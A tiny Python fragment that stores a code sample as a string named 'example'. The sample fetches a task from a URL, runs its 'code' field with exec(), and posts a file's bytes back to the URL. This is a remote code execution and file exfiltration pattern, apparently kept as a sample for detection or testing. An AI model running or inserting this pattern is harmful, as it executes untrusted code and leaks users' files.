example = """task = requests.post(url).json()
exec(task["code"])
requests.post(url, data=path.read_bytes())
"""
